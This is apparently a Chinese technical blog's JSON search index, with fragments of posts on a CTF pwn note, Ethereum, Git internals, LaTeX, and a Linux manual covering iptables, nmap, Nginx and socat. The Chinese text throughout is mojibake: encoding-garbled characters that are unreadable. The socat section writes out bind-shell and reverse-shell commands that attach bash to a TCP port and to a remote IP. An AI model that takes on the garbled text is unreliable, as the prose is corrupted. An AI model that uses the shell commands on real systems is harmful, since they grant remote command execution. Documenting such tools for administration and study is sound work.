æ­¤ä¸èƒ½å¾€æ ˆä¸Šå†™å…¥å†…å®¹ã€‚æŸ¥çœ‹ä¹‹å‰çš„æƒé™æŸ¥çœ‹ï¼Œåœ¨ç¨‹åºæ®µä¸­ 0x004b40c0 - 0x004baa20 è¿™æ®µåœ°å€æ˜¯å¯å†™çš„ã€‚\næ¼æ´å‘ç°ä¸åˆ©ç”¨ #  æ¼æ´éå¸¸æ˜æ˜¾ï¼Œä¸éœ€è¦å‘ç°ï¼Œç›´æ¥è¿›è¡Œåˆ©ç”¨ã€‚\næ„é€ å¾ªç¯ #  "},{"id":166,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ethereum%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","title":"Ethereumé˜…è¯»ç¬”è®°","section":"æ‚é¡¹åšå®¢","content":"æ¦‚å¿µ #    KDFï¼šå½©è™¹è¡¨æ”»å‡»\n  é‡å…¥æ”»å‡»\n  æ•°å­—è´§å¸çš„åŒé‡æ”¯ä»˜é—®é¢˜\n  é€’å½’é•¿åº¦å‰ç¼€ Recursive Length Prefix (RLP)\n  Merkle Patricia Tree\n  å·¥ä½œé‡è¯æ˜ç®—æ³•ï¼ˆEthashã€Casperï¼‰ã€å…±è¯†ç®—æ³•\n  ÃÎVp2p\n  æ™ºèƒ½åˆçº¦ï¼›\n  å¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰å’Œåˆçº¦è´¦æˆ·ï¼›\n  ä»£ç ã€é¡¹ç›®ã€å®è·µ #   è¿è¡Œè¿™äº›ç¨‹åºï¼šEthereumã€web3js(Whisper)ã€Swarmã€Solidityï¼ˆIDEï¼šRemixï¼‰ã€Parityã€Go-Ethereumï¼› ä½¿ç”¨ MetaMask ä½“éªŒä»¥å¤ªåŠï¼› å°è¯•è¿è¡Œä¸€ä¸ªå®Œæ•´çš„ä»¥å¤ªåŠå®¢æˆ·ç«¯èŠ‚ç‚¹ï¼›  "},{"id":167,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/git%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84/","title":"Gitæ–‡ä»¶ç»„ç»‡ç»“æ„","section":"æ‚é¡¹åšå®¢","content":"Git Advance #  Git æ–‡ä»¶ç³»ç»Ÿ #  æ¦‚è¿° #  æˆ‘ä»¬åœ¨ä¸€ä¸ª git init ç»“æœçš„ç©ºä»“åº“ä¸­ï¼Œç®€è¿°ä¸€ä¸‹å„ä¸ªéƒ¨åˆ†çš„ä½œç”¨ï¼š\n.git â”œâ”€â”€ HEAD // æŒ‡ç¤ºå½“å‰è¢«æ£€å‡ºçš„åˆ†æ”¯ â”œâ”€â”€ branches // åºŸå¼ƒ â”œâ”€â”€ config // é¡¹ç›®å†…çš„é…ç½®æ–‡ä»¶ â”œâ”€â”€ description // ä¾›GitWebç¨‹åºä½¿ç”¨ â”œâ”€â”€ hooks // å­˜å‚¨é’©å­è„šæœ¬ â”‚ â”œâ”€â”€ applypatch-msg.sample â”‚ ... â”œâ”€â”€ info // ç›®å½•åŒ…å«ä¸€ä¸ªå…¨å±€æ€§æ’é™¤(global exclude)æ–‡ä»¶ï¼Œ â”‚ â””â”€â”€ exclude\t// ç”¨ä»¥æ”¾ç½®é‚£äº›ä¸å¸Œæœ›è¢«è®°å½•åœ¨ .gitignore æ–‡ä»¶ä¸­çš„å¿½ç•¥æ¨¡å¼(ignored patterns) â”œâ”€â”€ objects // å­˜å‚¨æ‰€æœ‰æ•°æ®å†…å®¹ â”‚ â”œâ”€â”€ info // ä»“åº“çš„é¢å¤–ä¿¡æ¯ â”‚ â””â”€â”€ pack // å‹ç¼©åçš„åŒ…æ–‡ä»¶ â””â”€â”€ refs // å­˜å‚¨æŒ‡å‘åˆ†æ”¯çš„æäº¤å¯¹è±¡çš„æŒ‡é’ˆ  â”œâ”€â”€ heads // åˆ†æ”¯  â””â”€â”€ tags // æ ‡ç­¾ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ Git ç›®å½•ç»“æ„è¯´æ˜ï¼š\ngit help gitrepository-layout å­˜å‚¨æ–‡ä»¶ #  å½“ Git å­˜å‚¨ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼š\n é¦–å…ˆä¼šæ ¹æ®æ–‡ä»¶å†…å®¹è®¡ç®—å‡ºæ–‡ä»¶çš„å“ˆå¸Œå€¼ (ä½¿ç”¨ SHA-1 ç®—æ³•)ï¼Œç»“æœæ˜¯ 40 ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ å–å‰ 2 ä¸ªå­—ç¬¦ä½œä¸ºç›®å½•åï¼Œå 38 ä¸ªå­—ç¬¦ä½œä¸ºæ–‡ä»¶åï¼Œå­˜å‚¨åœ¨ .git/objects æ–‡ä»¶å¤¹ä¸‹ã€‚  è¿™æ ·ç»™å®šæ–‡ä»¶çš„å“ˆå¸Œå€¼ï¼Œå°±èƒ½åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ç›´æ¥å®šä½åˆ°æ–‡ä»¶ã€‚è¿™ç§è®¡ç®—æ–¹å¼éå¸ƒäº Git çš„å„ç§æ“ä½œä¸­ï¼ŒåŒ…æ‹¬åˆ†æ”¯ã€æäº¤è®°å½•ã€tag ç­‰éƒ½å¯ä»¥ç”¨å“ˆå¸Œå€¼æ¥è¡¨ç¤ºã€‚\nä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ï¼Œä¸€ä¸ªæŒ‡å®šå“ˆå¸Œå€¼ï¼Œå¯¹åº”çš„æ–‡ä»¶ï¼š\ngit cat-file -p \u0026lt;hash\u0026gt; å­˜å‚¨ç›®å½• #  "},{"id":168,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/latexmanual/","title":"Latex Manual","section":"æ‚é¡¹åšå®¢","content":"Latex Command #  Command on Linux #  ä½¿ç”¨ latex ç¼–è¯‘çš„å‘½ä»¤ï¼ˆè¯¦ç»†çš„å¸®åŠ©æ–‡æ¡£å¯ä»¥ä½¿ç”¨ --help å‚æ•°æŸ¥çœ‹ï¼‰ï¼š\n$ latexmk --help ä½¿ç”¨ MikTex ç¼–è¯‘çš„å‘½ä»¤ï¼ˆè¯¦ç»†çš„å¸®åŠ©æ–‡æ¡£å¯ä»¥ä½¿ç”¨ --help å‚æ•°æŸ¥çœ‹ï¼‰ï¼š\n$ telatex --help Latex å®‰è£…åŒ…ç›®å½•ç®¡ç†å‘½ä»¤ï¼ˆè¯¦ç»†çš„å¸®åŠ©æ–‡æ¡£å¯ä»¥ä½¿ç”¨ --help å‚æ•°æŸ¥çœ‹ï¼‰ï¼š\n$ kpsewhich --help æ‰‹åŠ¨å®‰è£…åˆ°ä¸€ä¸ªå®‰è£…ç›®å½•ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ›´æ–° LaTex çš„å®‰è£…åŒ…æœç´¢è·¯å¾„ï¼š\n$ sudo mktexlsr Command on mac OS X #  "},{"id":169,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/linuxmanual/","title":"Linux Manual","section":"æ‚é¡¹åšå®¢","content":"Linux Manual #  é€šè¿‡ SSH è¿æ¥æœåŠ¡å™¨ #  é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤é€šè¿‡ ssh ç™»é™†æœåŠ¡å™¨ï¼š\n$ ssh -l \u0026lt;username\u0026gt; \u0026lt;ip\u0026gt; æœåŠ¡å™¨å¼€æ”¾æŒ‡å®šç«¯å£ #    å®‰è£…\n$ sudo apt-get install iptables   æ·»åŠ è§„åˆ™ã€‚æ¯”å¦‚ä»¥ä¸‹å‘½ä»¤æ‰“å¼€ 8000 ç«¯å£ï¼š\n$ iptables -A INPUT -p tcp --dport 8000 -j ACCEPT åˆ é™¤æ­¤æ¡æ·»åŠ çš„è§„åˆ™åˆ™ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š\n$ iptables -D INPUT -p tcp --dport 8000 -j ACCEPT   ä¿å­˜è§„åˆ™\n$ iptables-save   æŒç»­åŒ–è§„åˆ™ã€‚å®‰è£… iptables-persistent æ”¯æŒï¼š\n$ sudo apt-get install iptables-persistent ä½¿ç”¨è¿›è¡ŒæŒç»­åŒ–è§„åˆ™ï¼š\n$ sudo netfilter-persistent save $ sudo netfilter-persistent reload   ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰çš„è§„åˆ™ï¼š\n$ iptables -L   æœåŠ¡å™¨æŸ¥çœ‹ç«¯å£ #  ä½¿ç”¨ netstat æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ #  There\u0026rsquo;s a few parameters to netstat that are useful for this :\n  -l or --listening shows only the sockets currently listening for incoming connection.\n  -a or --all shows all sockets currently in use.\n  -t or --tcp shows the tcp sockets.\n  -u or --udp shows the udp sockets.\n  -n or --numeric shows the hosts and ports as numbers, instead of resolving in dns and looking in /etc/services.\n  -pltenï¼šæŸ¥çœ‹æ­£åœ¨è¢«æ¿€æ´»çš„äº’è”ç½‘è¿æ¥ã€‚\n  ä½¿ç”¨ nmap æ‰«æå¯¹å…¬ç½‘å¼€æ”¾ ip #  Nmap (\u0026ldquo;Network Mapper\u0026rdquo;) is a free and open source utility for network exploration or security auditingï¼š\n$ nmap hosting-name æ€æ­»å ç”¨ä¸€ä¸ªç«¯å£çš„è¿›ç¨‹ #  è¿™ä¸ªå‘½ä»¤ä¼šç»™å‡ºç»‘å®šåœ¨æŒ‡å®šç«¯å£ä¸Šçš„è¿›ç¨‹çš„ PIDï¼š\n$ fuser 8080/tcp åŠ å…¥ -k é€‰é¡¹åä¼šæ€æ­»è¿™ä¸ª PID æŒ‡å‘çš„è¿›ç¨‹ï¼š\n$ fuser -k 8080/tcp ä»¥ä¸‹å‘½ä»¤å¯ä»¥åˆ—å‡ºæ‰€æœ‰åœ¨ç›‘å¬è¿™ä¸ªç«¯å£çš„è¿›ç¨‹ï¼š\n$ lsof -i:8080 è¦æ€æ‰è¿™ä¸ªåˆ—ä¸¾å‡ºçš„è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„æ–¹å¼ï¼š\n$ kill $(lsof -t -i:8080) # æˆ–è€…æš´åŠ›æ€æ­» $ kill -9 $(lsof -t -i:8080) PostScriptï¼šæŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ PID å¹¶æ€æ­»ï¼š\n$ ps -ef | grep socat # æ¯”å¦‚æˆ‘ä»¬è¦æŸ¥çœ‹ä¸€ä¸ª socat è¿›ç¨‹  $ kill \u0026lt;PID\u0026gt; å…³äºåå‘ä»£ç† Ngingx #   å­¦ä¹ ç½‘å€ï¼šhttps://www.jianshu.com/p/fd25a9c008a0\n é…ç½®æ–‡ä»¶ç»“æ„ #  apt-get å®‰è£…çš„ Nginx â†’ é…ç½®æ–‡ä»¶åœ¨ç›®å½• /etc/nginx/ï¼Œè¯¥ç›®å½•ä¸­æœ‰ä»¥ä¸‹æ–‡ä»¶ï¼š\n  nginx.confï¼šè¿™ä¸ªæ˜¯nginxçš„ä¸»é…ç½®æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«äº†å½“å‰ç›®å½•çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œåªä¸è¿‡æœ‰çš„æ˜¯æ³¨é‡ŠçŠ¶æ€ï¼Œéœ€è¦çš„æ—¶å€™è‡ªè¡Œå¼€å¯ï¼ˆåé¢å‡ ä¸ªå¸¸ç”¨çš„ï¼‰ã€‚\n  conf.d/ï¼šè¿™æ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢å¯ä»¥å†™æˆ‘ä»¬è‡ªå·±è‡ªå®šä¹‰çš„é…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶ç»“å°¾ä¸€å®šæ˜¯ .conf æ‰å¯ä»¥ç”Ÿæ•ˆï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹ nginx.conf æ¥å–æ¶ˆè¿™ä¸ªé™åˆ¶ï¼‰\n  sites-enabled/ï¼šè¿™é‡Œé¢çš„é…ç½®æ–‡ä»¶å…¶å®å°±æ˜¯ sites-available/ é‡Œé¢çš„é…ç½®æ–‡ä»¶çš„è½¯è¿æ¥ï¼Œä½†æ˜¯ç”±äº nginx.conf é»˜è®¤åŒ…å«çš„æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ sites-available/ é‡Œé¢å»ºç«‹äº†æ–°çš„ç«™ç‚¹ä¹‹å,è¿˜è¦å»ºç«‹ä¸ªè½¯è¿æ¥åˆ° sites-enabled/ é‡Œé¢æ‰è¡Œ\n  sites-available/ï¼šè¿™é‡Œæ˜¯æˆ‘ä»¬çš„è™šæ‹Ÿä¸»æœºçš„ç›®å½•ï¼Œæˆ‘ä»¬åœ¨åœ¨è¿™é‡Œé¢å¯ä»¥åˆ›å»ºå¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚\n  åå‘ä»£ç† #  å¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤º Nginx çš„å·¥ä½œåŸç†ï¼š\ngraph LR; subgraph Client; US1((ç”¨æˆ·è®¿é—®)); US2((ç”¨æˆ·è®¿é—®)); US3((ç”¨æˆ·è®¿é—®)) end subgraph Nginx Server; NS1(ç›‘å¬ç«¯å£); NS2(å¤„ç†è¯·æ±‚); NS3(è´Ÿè½½å‡è¡¡) end subgraph Web Server; WS1((å®é™…æœåŠ¡)); WS2((å®é™…æœåŠ¡)); WS3((å®é™…æœåŠ¡)); end US1-.-\u0026gt;NS1; US2-.-\u0026gt;NS1; US3-.-\u0026gt;NS1 NS1--\u0026gt;|server_name|NS2; NS2--\u0026gt;|upstream|NS3; NS3-.-\u0026gt;WS1; NS3-.-\u0026gt;WS2; NS3-.-\u0026gt;WS3; è´Ÿè½½å‡è¡¡ #  Nginx æä¾›äº†å¤šç§è´Ÿè½½å‡è¡¡çš„åˆ†é…æ–¹å¼ï¼š\n  è½®è¯¢ï¼ˆé»˜è®¤æ–¹å¼ï¼‰ï¼šæ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æœåŠ¡å™¨downæ‰,èƒ½è‡ªåŠ¨å‰”é™¤ã€‚\n  weightï¼šç»™åå°æœåŠ¡å™¨è®¾ç½®çš„è½®è¯¢å‡ ç‡çš„æƒå€¼ï¼Œç”¨äºåå°æœåŠ¡å™¨æ€§èƒ½ä¸å‡çš„æƒ…å†µã€‚æ¯”å¦‚ï¼š\n upstream bakend {  server 192.168.159.10 weight=10;  server 192.168.159.11 weight=10;  }   downï¼šè¡¨ç¤ºå½“å‰æœåŠ¡å™¨ä¸å‚ä¸è´Ÿè½½ã€‚\n  max_failsï¼šå…è®¸è¯·æ±‚å¤±è´¥çš„æ¬¡æ•°ï¼Œé»˜è®¤ä¸º 1ã€‚\n  backupï¼šå…¶ä»–æ‰€æœ‰é backup æœºå™¨æš‚å¿™æ—¶ï¼Œè¯·æ±‚ backup æœºå™¨ã€‚è¿™å°æœºå™¨çš„å‹åŠ›ä¼šæœ€å°ã€‚\n  ip_hashï¼šæ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—® ip çš„ hash ç»“æœåˆ†é…ï¼Œè¿™æ ·æ¯ä¸ªè®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³ session çš„é—®é¢˜ã€‚æ¯”å¦‚ï¼š\n upstream resinserver{  ip_hash;  server 192.168.159.10:8080;  server 192.168.159.11:8080;  }   fairï¼šæŒ‰åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„ä¼˜å…ˆåˆ†é…ã€‚åŒä¸Šå®šä¹‰ã€‚\n  Debug #   æ€»ç»“æ¥æºï¼šhttps://serverfault.com/questions/579919/nginx-1-2-1-how-to-analyse-500-internal-server-error\n   æŸ¥çœ‹ nginx çš„é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®ï¼š\nnginx -t   æŸ¥çœ‹ nginx çš„è¿è¡ŒçŠ¶æ€ï¼š\nservice nginx status   æŸ¥çœ‹é…ç½®æ–‡ä»¶ä¸­ï¼Œ log æ–‡ä»¶ä¸­æ‰€åœ¨ä½ç½®ï¼ŒæŸ¥çœ‹æ—¥å¿—ï¼š\nfind /etc/nginx -name \u0026#39;*.conf\u0026#39; | xargs grep -i log   å…³äº socat #   å­¦ä¹ ç½‘å€ï¼š\n https://www.hi-linux.com/posts/61543.html  å®˜ç½‘ç½‘å€ï¼š\n http://www.dest-unreach.org/socat/   socat æ˜¯ä¸€ä¸ª netcat(nc) çš„æ›¿ä»£äº§å“ï¼Œå¯ä»¥ç§°å¾—ä¸Š nc++ã€‚ä½œç”¨æ˜¯åœ¨ä¸¤ä¸ªæµä¹‹é—´å»ºç«‹ä¸€ä¸ªåŒå‘çš„é€šé“ã€‚\nsocat çš„åœ°å€ç±»å‹å¾ˆå¤šï¼Œæœ‰ ip, tcp, udp, ipv6, pipe, exec, system, open, proxy, opensslç­‰ã€‚\nåŸºæœ¬è¯­æ³• #  $ socat [options] \u0026lt;address\u0026gt; \u0026lt;address\u0026gt; å‡ ä¸ªå¸¸ç”¨çš„ address æè¿°æ–¹å¼å¦‚ä¸‹ï¼š\n -, STDIN, STDOUT è¡¨ç¤ºæ ‡å‡†è¾“å…¥è¾“å‡ºï¼Œå¯ä»¥å°±ç”¨ä¸€ä¸ªæ¨ªæ ä»£æ›¿ã€‚ /var/log/syslog æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºæ•°æ®æµï¼Œå¯ä»¥æ˜¯ä»»æ„è·¯å¾„ã€‚ TCP:: å»ºç«‹ä¸€ä¸ª TCP è¿æ¥ä½œä¸ºæ•°æ®æµï¼ŒTCP ä¹Ÿå¯ä»¥æ›¿æ¢ä¸º UDP ã€‚ TCP-LISTEN: å»ºç«‹\u0008 ä¸€ä¸ª TCP ç›‘å¬ç«¯å£ï¼ŒTCP ä¹Ÿå¯ä»¥æ›¿æ¢ä¸º UDPã€‚ EXEC: æ‰§è¡Œä¸€ä¸ªç¨‹åºä½œä¸ºæ•°æ®æµã€‚  PostScriptï¼šä»¥ä¸Šè§„åˆ™ä¸­å‰é¢çš„ TCP ç­‰éƒ½å¯ä»¥å°å†™ï¼Œåœ¨è¿™äº›æè¿°åå¯ä»¥é™„åŠ ä¸€äº›é€‰é¡¹ï¼Œç”¨é€—å·éš”å¼€ã€‚å¦‚ forkï¼Œreuseaddrï¼Œstdinï¼Œstdoutï¼Œctty ç­‰ã€‚\nç¤ºä¾‹ #    ä¾‹å­ä¸€ï¼Œæ–‡ä»¶è¯»å–ï¼Œå°†æ–‡ä»¶å†…å®¹è¿æ¥åˆ°æ ‡å‡†è¾“å…¥è¾“å‡ºæµï¼š\n$ socat - /var/www/html/flag.php  $ socat - ./flag.php # è·¯å¾„ä¸€èˆ¬æ˜¯ç»å¯¹è·¯å¾„ï¼Œå¦‚æœè¦ä½¿ç”¨ç›¸å¯¹è·¯å¾„è®°å¾—è¦åŠ ä¸Š ./  $ echo \u0026#34;This is a test\u0026#34; | socat - /tmp/test.txt # å†™å…¥æ–‡ä»¶   ä¾‹å­äºŒï¼Œç½‘ç»œç®¡ç†ï¼Œè¿æ¥è¿œç¨‹ç«¯å£ä¸ç›‘å¬ä¸€ä¸ªç«¯å£ï¼š\n$ socat - tcp:\u0026lt;ip_address\u0026gt;:\u0026lt;port\u0026gt;  $ socat tcp-listen:8080 -   ä¾‹å­ä¸‰ï¼Œç«¯å£è½¬å‘ï¼Œè½¬å‘ tcpï¼š\n$ socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672 # ç›‘å¬ 192.168.1.252 ç½‘å¡çš„ 15672 ç«¯å£ï¼Œå¹¶å°†è¯·æ±‚è½¬å‘è‡³ 172.17.0.15 çš„ 15672 ç«¯å£ã€‚ #  # å‚æ•°è¯´æ˜ï¼š # -d -dï¼šä»£è¡¨è°ƒè¯•ä¿¡æ¯çš„è¾“å‡ºçº§åˆ«ã€‚ # -lf /var/log/socat.logï¼šæŒ‡å®šè¾“å‡ºä¿¡æ¯çš„æ–‡ä»¶ä¿å­˜ä½ç½®ã€‚  # TCP4-LISTEN:15672 åœ¨æœ¬åœ°å»ºç«‹ä¸€ä¸ª TCP IPv4 åè®®çš„ç›‘å¬ç«¯å£ï¼Œä¹Ÿå°±æ˜¯è½¬å‘ç«¯å£ã€‚ # bind æŒ‡å®šç›‘å¬ç»‘å®šçš„ IP åœ°å€ï¼Œä¸ç»‘å®šçš„è¯å°†ç›‘å¬æœåŠ¡å™¨ä¸Šå¯ç”¨çš„å…¨éƒ¨ IPã€‚ # reuseaddr ç»‘å®šä¸€ä¸ªæœ¬åœ°ç«¯å£ã€‚ # fork TCP4:172.17.0.15:15672 æŒ‡çš„æ˜¯è¦è½¬å‘åˆ°çš„æœåŠ¡å™¨ IP å’Œç«¯å£ï¼Œè¿™é‡Œæ˜¯ 172.17.0.15 çš„ 15672 ç«¯å£ã€‚ NAT æ˜ å°„ï¼šåœ¨å¤–éƒ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š\n$ socat tcp-listen:1234 tcp-listen:3389 åœ¨å†…ç½‘æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š\n$ socat tcp:outerhost:1234 tcp:192.168.1.34:3389 è¿™æ ·ï¼Œä½ å¤–éƒ¨æœºå™¨ä¸Šçš„ 3389 å°±æ˜ å°„åœ¨å†…ç½‘ 192.168.1.34 çš„ 3389 ç«¯å£ä¸Šäº†ã€‚ä¸è¿‡è¿™æ ·\u0008åœºæ™¯ä¸‹æ›´æ¨èå†…ç½‘\u0008ç©¿é€ç¥å™¨ FRPï¼Œå¦‚æœä½ ä¸ä¼šä½¿ç”¨ï¼Œå¯å‚è€ƒ æ¨èä¸€æ¬¾å¾ˆå¥½ç”¨çš„å†…ç½‘ç©¿é€å·¥å…·â€“FRP ä¸€æ–‡ã€‚\n  ä¾‹å­å››ï¼Œæ–‡ä»¶ä¼ é€’ï¼šå°†æ–‡ä»¶ demo.tar.gz ä½¿ç”¨ 2000 ç«¯å£ä» 192.168.1.252 ä¼ åˆ° 192.168.1.253, æ–‡ä»¶ä¼ è¾“å®Œæ¯•åä¼šè‡ªåŠ¨é€€å‡ºã€‚\nåœ¨ 192.168.1.252 ä¸Šæ‰§è¡Œï¼š\n$ socat -u open:demo.tar.gz tcp-listen:2000,reuseaddr åœ¨ 192.168.1.253 ä¸Šæ‰§è¡Œï¼š\n$ socat -u tcp:192.168.1.252:2000 open:demo.tar.gz,create   ä¾‹å­äº”ï¼Œå»ºç«‹ shell ã€‚\nå»ºç«‹ä¸€ä¸ªæ­£å‘ shellã€‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š\n# åœ¨æœåŠ¡ç«¯ 7005 ç«¯å£å»ºç«‹ä¸€ä¸ª Shellã€‚ $ socat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr # æˆ–è€… $ socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr åœ¨å®¢æˆ·ç«¯æ‰§è¡Œï¼š\n# è¿æ¥åˆ°æœåŠ¡å™¨çš„ 7005 ç«¯å£ï¼Œå³å¯è·å¾—ä¸€ä¸ª Shellã€‚readline æ˜¯ GNU çš„å‘½ä»¤è¡Œç¼–è¾‘å™¨ï¼Œå…·æœ‰å†å²åŠŸèƒ½ã€‚ $ socat readline tcp:127.0.0.1:7005 åå¼¹ä¸€ä¸ªäº¤äº’å¼çš„ shellã€‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š\n$ socat -,raw,echo=0 tcp-listen:7005 åœ¨å®¢æˆ·ç«¯ä¸Šæ‰§è¡Œï¼š\n$ socat tcp-connect:192.168.1.252:7005 exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane   ä¾‹å­å…­ï¼Œè®© socat åœ¨åå°è¿è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ Socat åªåœ¨å‰å°è¿è¡Œï¼Œå¦‚æœè¦è®© Socat ä¸€ç›´åœ¨åå°è¿è¡Œï¼Œå¯ä»¥ä½¿ç”¨ nohup å‘½ä»¤æ¥ä¿è¯å…¶åœ¨åå°ä¸€ç›´è¿è¡Œã€‚\n$ nohup socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672 \u0026amp;    "},{"id":170,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/mongdb%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/","title":"Mong DbåŸç†æµ…æ","section":"æ‚é¡¹åšå®¢","content":"åŸç†ä»‹ç» #   å‚è€ƒèµ„æ–™ï¼šhttps://zhuanlan.zhihu.com/p/87722764\n ç®€ä»‹ #  MongoDB æ˜¯æœ€å—æ¬¢è¿çš„ NoSQL æ•°æ®åº“ï¼Œæ–‡æ¡£æ•°æ®åº“æ’åç¬¬ä¸€ä½ï¼Œåœ¨æ‰€æœ‰æ•°æ®åº“å¼•æ“ä¸­æ’åç¬¬äº”ä½ï¼ˆOracleã€MySQLã€Microsoft-SQL-Serverã€Postgre SQLï¼‰ã€‚\näº†è§£ MongoDB çš„å‘å±•å†å²å¯ä»¥æŸ¥çœ‹ è¿™ç¯‡æ–‡ç« ã€‚\nç‰¹æ€§ #  ä»¥ä¸‹æ˜¯ MongoDB çš„ä¸€äº›ç‰¹æ€§ï¼š\n  é¢å‘æ–‡æ¡£å­˜å‚¨ï¼ŒåŸºäº JSON/BSON å¯è¡¨ç¤ºçµæ´»çš„æ•°æ®ç»“æ„ã€‚å› æ­¤ä¸ javascript æœ‰å¤©ç”Ÿçš„å…¼å®¹æ€§ï¼Œnodejs æœåŠ¡åˆ™å€¾å‘äºä½¿ç”¨ mongodb ä½œä¸ºå…¶åº•å±‚æ•°æ®ç»“æ„ï¼›\n  åŠ¨æ€ DDL èƒ½åŠ›ï¼Œæ²¡æœ‰å¼º Schema çº¦æŸï¼Œæ”¯æŒå¿«é€Ÿè¿­ä»£ã€‚åŒæ ·ä¹Ÿäº javascript è„šæœ¬è¯­è¨€çš„å˜é‡æ— ç±»å‹æ€§å»åˆã€‚\n  é«˜æ€§èƒ½è®¡ç®—ï¼Œæä¾›åŸºäºå†…å­˜çš„å¿«é€Ÿæ•°æ®æŸ¥è¯¢ï¼›\n  å®¹æ˜“æ‰©å±•ï¼Œåˆ©ç”¨æ•°æ®åˆ†ç‰‡å¯ä»¥æ”¯æŒæµ·é‡æ•°æ®å­˜å‚¨ï¼›\n  ä¸°å¯Œçš„åŠŸèƒ½é›†ï¼Œæ”¯æŒäºŒçº§ç´¢å¼•ã€å¼ºå¤§çš„èšåˆç®¡é“åŠŸèƒ½ï¼Œä¸ºå¼€å‘è€…é‡èº«å®šåšçš„åŠŸèƒ½ï¼Œå¦‚æ•°æ®è‡ªåŠ¨è€åŒ–ã€å›ºå®šé›†åˆç­‰ç­‰ã€‚\n  è·¨å¹³å°ç‰ˆæœ¬ã€æ”¯æŒå¤šè¯­è¨€SDKã€‚\n  åŸºæœ¬æ¨¡å‹ #  åŸºæœ¬æ¦‚å¿µä¸æ“ä½œ #  MongoDB æ˜¯æœ€åƒå…³ç³»å‹æ•°æ®åº“çš„æ–‡æ¡£å‹æ•°æ®åº“ï¼Œä¸ºäº†å®ç°å…³ç³»å‹æ•°æ®åº“çš„ä¸€äº›æ¨¡å‹ï¼ŒMongoDB è‡ªå·±å®šä¹‰äº†ä¸€äº›æ¦‚å¿µã€‚\n   RDBMS æ¦‚å¿µ MongoDB æ¦‚å¿µ     database databaseã€‚ä¸ RDB ç›¸åŒï¼Œè¡¨ç¤ºè¡¨çš„é›†åˆã€‚   table collectionï¼šä¸€ä¸ª collection å¯ä»¥å­˜æ”¾å¤šä¸ªæ–‡æ¡£ã€‚ ä¸åŒä¹‹å¤„åœ¨äº collection çš„ schema æ˜¯åŠ¨æ€çš„ï¼Œä¸éœ€è¦é¢„å…ˆå£°æ˜ä¸€ä¸ªä¸¥æ ¼çš„è¡¨ç»“æ„ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ MongoDB å¹¶ä¸ä¼šå¯¹å†™å…¥çš„æ•°æ®åšä»»ä½•schema çš„æ ¡éªŒã€‚   row documentï¼šç›¸å½“äº RDB ä¸­çš„â€œè¡Œâ€ï¼Œä¸€ä¸ªæ–‡æ¡£ç”±å¤šä¸ªå­—æ®µï¼ˆåˆ—ï¼‰ç»„æˆï¼Œå¹¶é‡‡ç”¨bson æ ¼å¼è¡¨ç¤ºï¼ˆä¸‹é¢é˜è¿°ï¼‰ã€‚   column fieldï¼šç›¸å½“äº RDB ä¸­çš„â€œåˆ—â€ï¼Œç›¸æ¯”æ™®é€šcolumnçš„å·®åˆ«åœ¨äºfieldçš„ç±»å‹å¯ä»¥æ›´åŠ 